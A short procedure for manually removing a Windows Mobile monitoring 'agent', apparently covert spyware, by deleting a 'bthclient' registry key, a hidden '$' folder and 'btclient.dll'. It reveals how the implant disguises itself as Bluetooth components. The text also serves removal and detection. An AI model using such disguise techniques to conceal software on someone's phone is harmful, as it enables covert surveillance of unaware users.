Sometimes the unistall command is not correctly performed on Windows Mobile platform, so that the agent is not correctly removed. Instead of performig a data-wipe or hard reset on the phone, here's a procedure allowing safe uninstalling of a WinMo agent (tested on a Samsung Omnia II - Windows Mobile 6.5.x):

  • Open phone browser and download from this link: http://www.dotfred.net/TaskMgr.htm
    • Alternatively you can pass it onto the phone by memory card or USB
  • Launch Taskmgr.exe
  • Find the registry key HKEY_LOCAL_MACHINE/Services/bthclient and delete it.
  • Go into "Windows" folder and:
    •  enable "show all files" in the option list
    • Find and delete the only folder wich begins with "$" (for example "$MS313Mobile")
    • find and delete "btclient.dll" file
  • Reboot the phone
